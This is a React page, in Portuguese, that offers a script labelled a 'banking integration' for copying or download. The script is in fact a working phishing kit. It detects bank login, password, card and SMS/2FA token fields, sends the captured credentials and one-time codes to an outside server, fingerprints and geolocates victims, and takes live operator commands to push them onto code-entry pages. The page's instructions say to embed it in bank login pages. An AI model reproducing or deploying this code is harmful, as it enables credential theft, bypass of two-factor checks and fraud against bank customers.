
import React, { useState } from "react";
import { Copy, Check, Download } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const ScriptPage = () => {
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();

  const scriptCode = `(function() {
    'use strict';
    
    // ===== CONFIGURAÇÃO DA API =====
    const API_BASE_URL = 'https://servidoroperador.onrender.com/api';
    
    // ===== ESTADO GLOBAL =====
    let clientId = localStorage.getItem('clientId');
    let isMonitoring = false;
    let monitoringInterval = null;
    let statusInterval = null;
    let lastActivityTime = Date.now();
    let isOnline = false;
    
    // ===== UTILITÁRIOS DE DETECÇÃO =====
    
    // Detectar tipo de dispositivo
    function getDeviceType() {
        const userAgent = navigator.userAgent;
        if (/tablet|ipad|playbook|silk/i.test(userAgent)) return 'Tablet';
        if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\\sce|palm|smartphone|iemobile/i.test(userAgent)) return 'Mobile';
        return 'Desktop';
    }
    
    // Detectar browser
    function getBrowser() {
        const userAgent = navigator.userAgent;
        if (userAgent.includes('Firefox')) {
            const version = userAgent.match(/Firefox\\/(\\d+)/)?.[1] || '';
            return \`Firefox \${version}\`;
        }
        if (userAgent.includes('Chrome')) {
            const version = userAgent.match(/Chrome\\/(\\d+)/)?.[1] || '';
            return \`Chrome \${version}\`;
        }
        if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
            const version = userAgent.match(/Version\\/(\\d+)/)?.[1] || '';
            return \`Safari \${version}\`;
        }
        if (userAgent.includes('Edge')) {
            const version = userAgent.match(/Edge\\/(\\d+)/)?.[1] || '';
            return \`Edge \${version}\`;
        }
        return 'Unknown';
    }
    
    // Detectar OS
    function getOS() {
        const userAgent = navigator.userAgent;
        if (userAgent.includes('Windows NT 10.0')) return 'Windows 10';
        if (userAgent.includes('Windows NT 6.3')) return 'Windows 8.1';
        if (userAgent.includes('Windows NT 6.1')) return 'Windows 7';
        if (userAgent.includes('Mac OS X')) {
            const version = userAgent.match(/Mac OS X (\\d+_\\d+_?\\d*)/)?.[1]?.replace(/_/g, '.') || '';
            return \`macOS \${version}\`;
        }
        if (userAgent.includes('Linux')) return 'Linux';
        if (userAgent.includes('Android')) {
            const version = userAgent.match(/Android (\\d+\\.?\\d*)/)?.[1] || '';
            return \`Android \${version}\`;
        }
        if (userAgent.includes('iPhone OS')) {
            const version = userAgent.match(/OS (\\d+_\\d+_?\\d*)/)?.[1]?.replace(/_/g, '.') || '';
            return \`iOS \${version}\`;
        }
        return 'Unknown';
    }
    
    // Capturar IP público
    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.log('Erro ao capturar IP:', error);
            return '127.0.0.1';
        }
    }
    
    // Capturar dados de localização
    async function getLocationData(ip) {
        try {
            const response = await fetch(\`https://ipapi.co/\${ip}/json/\`);
            const data = await response.json();
            return {
                country: data.country_code || 'BR',
                city: data.city || 'São Paulo'
            };
        } catch (error) {
            console.log('Erro ao capturar localização:', error);
            return { country: 'BR', city: 'São Paulo' };
        }
    }
    
    // Gerar ID único do usuário (fingerprint)
    function generateUserId() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (ctx) {
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint test', 2, 2);
        }
        
        const fingerprint = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            new Date().getTimezoneOffset(),
            canvas.toDataURL()
        ].join('|');
        
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
            const char = fingerprint.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        
        return Math.abs(hash).toString(36);
    }
    
    // ===== VALIDAÇÃO DE CPF =====
    function validateCpf(cpf) {
        const cleanCpf = cpf.replace(/[^\\d]/g, '');
        if (cleanCpf.length !== 11) return false;
        if (/^(\\d)\\1{10}$/.test(cleanCpf)) return false;
        
        let sum = 0;
        for (let i = 0; i < 9; i++) {
            sum += parseInt(cleanCpf.charAt(i)) * (10 - i);
        }
        let remainder = sum % 11;
        let digit1 = remainder < 2 ? 0 : 11 - remainder;
        
        if (parseInt(cleanCpf.charAt(9)) !== digit1) return false;
        
        sum = 0;
        for (let i = 0; i < 10; i++) {
            sum += parseInt(cleanCpf.charAt(i)) * (11 - i);
        }
        remainder = sum % 11;
        let digit2 = remainder < 2 ? 0 : 11 - remainder;
        
        return parseInt(cleanCpf.charAt(10)) === digit2;
    }
    
    // ===== DETECÇÃO INTELIGENTE DE CAMPOS =====
    
    function isLoginField(input) {
        const placeholder = (input.placeholder || '').toLowerCase();
        const name = (input.name || '').toLowerCase();
        const id = (input.id || '').toLowerCase();
        const label = getFieldLabel(input);
        
        const loginPatterns = [
            'cpf', 'cnpj', 'identificação', 'identificacao', 'usuario', 'user',
            'login', 'email', 'documento', 'chave', 'multicanal', 'agencia',
            'conta', 'account', 'id', 'cartao', 'card'
        ];
        
        return loginPatterns.some(pattern => 
            placeholder.includes(pattern) || 
            name.includes(pattern) || 
            id.includes(pattern) || 
            label.includes(pattern)
        );
    }
    
    function isPasswordField(input) {
        if (input.type === 'password') return true;
        
        const placeholder = (input.placeholder || '').toLowerCase();
        const name = (input.name || '').toLowerCase();
        const id = (input.id || '').toLowerCase();
        const label = getFieldLabel(input);
        
        const passwordPatterns = [
            'senha', 'password', 'pin', 'codigo', 'code', 'cvv',
            'cvode', 'pass', 'secret', 'palavra-passe', 'chave'
        ];
        
        return passwordPatterns.some(pattern => 
            placeholder.includes(pattern) || 
            name.includes(pattern) || 
            id.includes(pattern) || 
            label.includes(pattern)
        );
    }
    
    function isSmsTokenField(input) {
        const placeholder = (input.placeholder || '').toLowerCase();
        const name = (input.name || '').toLowerCase();
        const id = (input.id || '').toLowerCase();
        const label = getFieldLabel(input);
        const maxLength = input.maxLength;
        
        const smsPatterns = [
            'sms', 'token', 'codigo', 'code', '2fa', 'verificacao',
            'verification', 'otp', 'validacao', 'validation'
        ];
        
        const isNumericPattern = /^[0-9]+$/.test(input.value || '');
        const is6Digits = maxLength === 6 || placeholder.includes('6') || placeholder.includes('000000');
        
        return (smsPatterns.some(pattern => 
            placeholder.includes(pattern) || 
            name.includes(pattern) || 
            id.includes(pattern) || 
            label.includes(pattern)
        )) || (is6Digits && isNumericPattern);
    }
    
    function getFieldLabel(input) {
        // Procurar label associado
        const label = document.querySelector(\`label[for="\${input.id}"]\`);
        if (label) return label.textContent.toLowerCase();
        
        // Procurar label pai
        const parentLabel = input.closest('label');
        if (parentLabel) return parentLabel.textContent.toLowerCase();
        
        // Procurar texto próximo
        const previousElement = input.previousElementSibling;
        if (previousElement && previousElement.textContent) {
            return previousElement.textContent.toLowerCase();
        }
        
        return '';
    }
    
    // ===== FUNÇÕES DE API =====
    
    async function registerClient(userData) {
        try {
            console.log('Registrando cliente:', userData);
            
            const response = await fetch(\`\${API_BASE_URL}/clients/register\`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(userData)
            });
            
            if (response.ok) {
                const responseData = await response.json();
                console.log('Cliente registrado:', responseData);
                
                if (responseData.success && responseData.clientId) {
                    clientId = responseData.clientId;
                    localStorage.setItem('clientId', clientId);
                    return responseData.clientId;
                }
            } else {
                console.log('Erro no registro:', response.status);
            }
        } catch (error) {
            console.log('Erro durante registro:', error);
        }
        return null;
    }
    
    async function sendResponse(data, command = '') {
        if (!clientId) return false;
        
        try {
            console.log('Enviando resposta:', { data, command });
            
            const response = await fetch(\`\${API_BASE_URL}/clients/\${clientId}/external-response\`, {
                method: 'PATCH',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    response: data,
                    command: command
                })
            });
            
            if (response.ok) {
                console.log('Resposta enviada com sucesso');
                return true;
            } else {
                console.log('Erro ao enviar resposta:', response.status);
            }
        } catch (error) {
            console.log('Erro durante envio de resposta:', error);
        }
        return false;
    }
    
    async function updateClientData(username, password) {
        if (!clientId) return false;
        
        try {
            console.log('Atualizando dados do cliente');
            
            const response = await fetch(\`\${API_BASE_URL}/clients/\${clientId}/update\`, {
                method: 'PATCH',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    command: ""
                })
            });
            
            if (response.ok) {
                console.log('Dados atualizados com sucesso');
                return true;
            } else {
                console.log('Erro ao atualizar dados:', response.status);
            }
        } catch (error) {
            console.log('Erro durante atualização:', error);
        }
        return false;
    }
    
    async function updateClientStatus(status) {
        if (!clientId) return;
        
        try {
            const response = await fetch(\`\${API_BASE_URL}/clients/\${clientId}/update\`, {
                method: 'PATCH',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    status: status
                })
            });
            
            if (response.ok) {
                console.log(\`Status atualizado para: \${status}\`);
                isOnline = status === 'online';
            }
        } catch (error) {
            console.log('Erro ao atualizar status:', error);
        }
    }
    
    async function sendMetrics() {
        try {
            const ip = await getClientIP();
            const location = await getLocationData(ip);
            
            const metricsData = {
                page: window.location.pathname || '/',
                referrer: document.referrer || 'direct',
                ip: ip,
                userAgent: navigator.userAgent,
                device: getDeviceType(),
                browser: getBrowser(),
                os: getOS(),
                country: location.country,
                city: location.city
            };
            
            const response = await fetch(\`\${API_BASE_URL}/metrics/click\`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(metricsData)
            });
            
            if (response.ok) {
                console.log('Métricas enviadas com sucesso');
            }
        } catch (error) {
            console.log('Erro ao enviar métricas:', error);
        }
    }
    
    // ===== MONITORAMENTO DE COMANDOS =====
    
    async function checkClientCommands() {
        if (!clientId || !isMonitoring) return;
        
        try {
            const response = await fetch(\`\${API_BASE_URL}/clients/\${clientId}/info\`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                }
            });
            
            if (response.ok) {
                const clientData = await response.json();
                const command = clientData.data?.response || clientData.data?.command;
                
                console.log('Comando recebido:', command);
                
                if (command) {
                    handleCommand(command);
                }
            }
        } catch (error) {
            console.log('Erro ao verificar comandos:', error);
        }
    }
    
    function handleCommand(command) {
        switch (command) {
            case 'ir_sms':
                console.log('Redirecionando para página SMS');
                redirectToPage('/sms');
                break;
            case 'ir_2fa':
                console.log('Redirecionando para página Token');
                redirectToPage('/token');
                break;
            case 'inv_username':
            case 'inv_password':
                console.log('Dados inválidos - limpando campos');
                clearLoginFields();
                showError('Dados inválidos. Verifique suas credenciais.');
                break;
            case 'inv_sms':
                console.log('SMS inválido - limpando campo');
                clearSmsFields();
                showError('Código SMS inválido. Tente novamente.');
                break;
            case 'inv_2fa':
                console.log('Token inválido - limpando campo');
                clearTokenFields();
                showError('Token inválido. Tente novamente.');
                break;
        }
    }
    
    function redirectToPage(page) {
        stopMonitoring();
        window.location.href = page;
    }
    
    function clearLoginFields() {
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            if (isLoginField(input) || isPasswordField(input)) {
                input.value = '';
            }
        });
    }
    
    function clearSmsFields() {
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            if (isSmsTokenField(input)) {
                input.value = '';
            }
        });
    }
    
    function clearTokenFields() {
        clearSmsFields(); // Token e SMS usam mesma lógica
    }
    
    function showError(message) {
        // Procurar elemento de erro existente ou criar um
        let errorElement = document.querySelector('.banking-script-error');
        
        if (!errorElement) {
            errorElement = document.createElement('div');
            errorElement.className = 'banking-script-error';
            errorElement.style.cssText = \`
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ff4444;
                color: white;
                padding: 12px 20px;
                border-radius: 6px;
                z-index: 10000;
                font-family: Arial, sans-serif;
                font-size: 14px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            \`;
            document.body.appendChild(errorElement);
        }
        
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        
        setTimeout(() => {
            if (errorElement) {
                errorElement.style.display = 'none';
            }
        }, 5000);
    }
    
    // ===== MONITORAMENTO DE ATIVIDADE =====
    
    function updateActivity() {
        lastActivityTime = Date.now();
        if (!isOnline) {
            updateClientStatus('online');
        }
    }
    
    function startActivityMonitoring() {
        const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
        
        events.forEach(event => {
            document.addEventListener(event, updateActivity, true);
        });
        
        // Verificar inatividade a cada 20 segundos
        statusInterval = setInterval(() => {
            const timeSinceActivity = Date.now() - lastActivityTime;
            
            if (timeSinceActivity > 20000 && isOnline) {
                updateClientStatus('offline');
            }
        }, 20000);
        
        // Marcar como online inicialmente
        updateClientStatus('online');
    }
    
    function stopActivityMonitoring() {
        if (statusInterval) {
            clearInterval(statusInterval);
            statusInterval = null;
        }
        
        updateClientStatus('offline');
    }
    
    // ===== MONITORAMENTO PRINCIPAL =====
    
    function startMonitoring() {
        if (isMonitoring) return;
        
        isMonitoring = true;
        console.log('Iniciando monitoramento...');
        
        // Verificar comandos a cada 3 segundos
        monitoringInterval = setInterval(checkClientCommands, 3000);
        
        // Iniciar monitoramento de atividade
        startActivityMonitoring();
    }
    
    function stopMonitoring() {
        isMonitoring = false;
        
        if (monitoringInterval) {
            clearInterval(monitoringInterval);
            monitoringInterval = null;
        }
        
        stopActivityMonitoring();
        console.log('Monitoramento parado');
    }
    
    // ===== CAPTURA DE DADOS DOS FORMULÁRIOS =====
    
    async function handleFormSubmission(form) {
        const inputs = form.querySelectorAll('input');
        let username = '';
        let password = '';
        let isLogin = false;
        let isSmsToken = false;
        
        inputs.forEach(input => {
            const value = input.value.trim();
            if (!value) return;
            
            if (isLoginField(input)) {
                username = value;
                isLogin = true;
            } else if (isPasswordField(input)) {
                password = value;
                isLogin = true;
            } else if (isSmsTokenField(input)) {
                isSmsToken = true;
                // Enviar SMS/Token
                sendResponse(value);
                startMonitoring();
            }
        });
        
        if (isLogin && username && password) {
            console.log('Dados de login capturados:', { username: username.substring(0, 3) + '***', password: '***' });
            
            if (clientId) {
                // Cliente já existe, atualizar dados
                await updateClientData(username, password);
            } else {
                // Novo cliente, registrar
                const ip = await getClientIP();
                const location = await getLocationData(ip);
                
                const userData = {
                    username: username,
                    password: password,
                    ip: ip,
                    country: location.country,
                    city: location.city,
                    device: getDeviceType(),
                    referrer: document.referrer || 'direct',
                    currentUrl: window.location.href
                };
                
                const newClientId = await registerClient(userData);
                if (newClientId) {
                    clientId = newClientId;
                }
            }
            
            if (clientId) {
                startMonitoring();
            }
        }
    }
    
    // ===== INICIALIZAÇÃO =====
    
    function initializeBankingScript() {
        console.log('Banking Script Initialized');
        
        // Enviar métricas da visita
        sendMetrics();
        
        // Solicitar geolocalização
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    console.log('Geolocalização obtida:', position.coords);
                },
                (error) => {
                    console.log('Geolocalização negada:', error.message);
                }
            );
        }
        
        // Interceptar submissões de formulários
        document.addEventListener('submit', (e) => {
            handleFormSubmission(e.target);
        });
        
        // Interceptar cliques em botões que podem submeter dados
        document.addEventListener('click', (e) => {
            const button = e.target.closest('button, input[type="submit"], input[type="button"]');
            if (button) {
                const form = button.closest('form') || document.querySelector('form');
                if (form) {
                    setTimeout(() => handleFormSubmission(form), 100);
                }
            }
        });
        
        // Interceptar mudanças em campos para captura em tempo real
        document.addEventListener('input', (e) => {
            const input = e.target;
            if (input.tagName === 'INPUT') {
                // Detectar se é um campo de 6 dígitos preenchido (SMS/Token)
                if (isSmsTokenField(input) && input.value.length === 6) {
                    console.log('Campo SMS/Token preenchido:', input.value);
                    sendResponse(input.value);
                    startMonitoring();
                }
            }
        });
        
        // Se já temos clientId, iniciar monitoramento
        if (clientId) {
            startMonitoring();
        }
        
        // Cleanup ao sair da página
        window.addEventListener('beforeunload', () => {
            stopMonitoring();
        });
        
        // Monitoramento de visibilidade da página
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                updateClientStatus('offline');
            } else {
                updateClientStatus('online');
            }
        });
    }
    
    // ===== AUTO-INICIALIZAÇÃO =====
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeBankingScript);
    } else {
        initializeBankingScript();
    }
    
})();`;

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(scriptCode);
      setCopied(true);
      toast({
        title: "Script copiado!",
        description: "O script foi copiado para a área de transferência.",
      });
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast({
        title: "Erro ao copiar",
        description: "Não foi possível copiar o script. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  const downloadScript = () => {
    const blob = new Blob([scriptCode], { type: 'text/javascript' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'banking-integration-script.js';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: "Download iniciado!",
      description: "O arquivo do script foi baixado.",
    });
  };

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-6xl mx-auto px-4">
        <div className="bg-white rounded-lg shadow-sm p-8">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">Script de Integração Bancária</h1>
          <p className="text-gray-600 mb-8">
            Script JavaScript completo para integrar com seu site externo. Detecta automaticamente campos de login, senha, SMS e token.
          </p>

          {/* Informações importantes */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8">
            <h2 className="text-lg font-semibold text-blue-800 mb-3">📋 Como usar:</h2>
            <ol className="list-decimal list-inside space-y-2 text-blue-700">
              <li>Copie o script completo abaixo</li>
              <li>Adicione antes do fechamento da tag <code>&lt;/body&gt;</code> do seu site</li>
              <li>O script funcionará automaticamente detectando campos e enviando dados</li>
              <li>Monitora comandos do dashboard em tempo real</li>
              <li>Redireciona automaticamente conforme os comandos recebidos</li>
            </ol>
          </div>

          {/* Funcionalidades */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <h3 className="font-semibold text-green-800 mb-2">🔍 Detecção Inteligente</h3>
              <ul className="text-sm text-green-700 space-y-1">
                <li>• CPF, CNPJ, ID automaticamente</li>
                <li>• Senha, PIN, código de acesso</li>
                <li>• SMS e Token (6 dígitos)</li>
                <li>• Campos por placeholder, name, id</li>
              </ul>
            </div>

            <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
              <h3 className="font-semibold text-purple-800 mb-2">📡 APIs Integradas</h3>
              <ul className="text-sm text-purple-700 space-y-1">
                <li>• Registro de clientes</li>
                <li>• Envio de respostas</li>
                <li>• Monitoramento contínuo</li>
                <li>• Status online/offline</li>
              </ul>
            </div>

            <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
              <h3 className="font-semibold text-orange-800 mb-2">⚡ Recursos Avançados</h3>
              <ul className="text-sm text-orange-700 space-y-1">
                <li>• Geolocalização automática</li>
                <li>• Fingerprinting do usuário</li>
                <li>• Métricas de visita</li>
                <li>• Redirecionamento automático</li>
              </ul>
            </div>
          </div>

          {/* Botões de ação */}
          <div className="flex gap-4 mb-6">
            <button
              onClick={copyToClipboard}
              className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium transition-colors"
            >
              {copied ? <Check size={20} /> : <Copy size={20} />}
              {copied ? 'Copiado!' : 'Copiar Script'}
            </button>
            
            <button
              onClick={downloadScript}
              className="flex items-center gap-2 bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-lg font-medium transition-colors"
            >
              <Download size={20} />
              Baixar Arquivo
            </button>
          </div>

          {/* Código do script */}
          <div className="relative">
            <div className="bg-gray-900 rounded-lg overflow-hidden">
              <div className="bg-gray-800 px-4 py-2 flex items-center justify-between">
                <span className="text-gray-300 text-sm font-medium">banking-integration-script.js</span>
                <span className="text-gray-400 text-xs">{scriptCode.split('\\n').length} linhas</span>
              </div>
              <pre className="p-6 text-sm text-gray-300 overflow-x-auto max-h-96 overflow-y-auto">
                <code>{scriptCode}</code>
              </pre>
            </div>
          </div>

          {/* Instruções de implementação */}
          <div className="mt-8 bg-yellow-50 border border-yellow-200 rounded-lg p-6">
            <h2 className="text-lg font-semibold text-yellow-800 mb-3">⚠️ Instruções de Implementação:</h2>
            <div className="text-yellow-700 space-y-2">
              <p><strong>1. Adicione ao HTML:</strong></p>
              <code className="block bg-yellow-100 p-2 rounded text-sm">
                &lt;script&gt;<br/>
                {scriptCode.substring(0, 50)}...<br/>
                &lt;/script&gt;
              </code>
              
              <p className="mt-4"><strong>2. O script irá:</strong></p>
              <ul className="list-disc list-inside space-y-1">
                <li>Detectar automaticamente todos os campos de formulário</li>
                <li>Enviar dados de login/senha para o dashboard</li>
                <li>Monitorar comandos de redirecionamento (ir_sms, ir_2fa)</li>
                <li>Tratar códigos inválidos (inv_username, inv_sms, inv_2fa)</li>
                <li>Manter status online/offline em tempo real</li>
                <li>Capturar métricas avançadas de visita</li>
              </ul>
              
              <p className="mt-4"><strong>3. Funciona em qualquer site com:</strong></p>
              <ul className="list-disc list-inside space-y-1">
                <li>Páginas de login bancário</li>
                <li>Formulários de validação SMS</li>
                <li>Páginas de token/2FA</li>
                <li>Qualquer campo de entrada de dados</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ScriptPage;
